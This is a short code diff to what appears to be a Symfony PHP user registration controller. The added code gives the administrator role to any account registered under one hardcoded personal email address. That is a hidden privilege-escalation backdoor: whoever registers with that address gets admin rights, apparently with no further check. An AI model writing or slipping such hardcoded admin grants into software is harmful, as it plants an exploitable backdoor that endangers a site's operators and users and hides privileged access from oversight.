@@ -52,7 +52,12 @@ class RegistrationController extends AbstractController
                     $user = new User();
                     $user->setEmail($email);
                     $user->setUsername($username);
-                    $user->setRoles(['ROLE_USER']);
+
+                    $roles = ['ROLE_USER'];
+                    if (strtolower($email) === 'ilyass.firar88@gmail.com') {
+                        $roles[] = 'ROLE_ADMIN';
+                    }
+                    $user->setRoles(array_unique($roles));
 
                     // Hash the password
                     $hashedPassword = $passwordHasher->hashPassword($user, $password);
